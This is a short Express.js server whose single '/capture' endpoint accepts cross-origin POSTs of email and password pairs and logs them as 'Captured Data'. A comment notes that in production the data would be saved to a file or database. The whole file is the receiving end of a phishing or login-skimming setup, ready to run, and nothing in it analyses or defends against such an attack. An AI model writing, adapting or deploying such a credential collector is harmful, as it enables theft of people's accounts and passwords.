const express = require('express');
const cors = require('cors');
const app = express();
const port = 3000;

app.use(cors({
    origin: "*"
}))
app.use(express.json()); // Parse JSON bodies

// Endpoint to capture login data
app.post('/capture', (req, res) => {
  const { email, password } = req.body;
  console.log('Captured Data:', { email, password });
  // For demo, just log to console; in production, save to a file or database
  res.status(200).json({ message: 'Data received' });
});

app.listen(port, () => {
  console.log(`Server running at http://localhost:${port}`);
});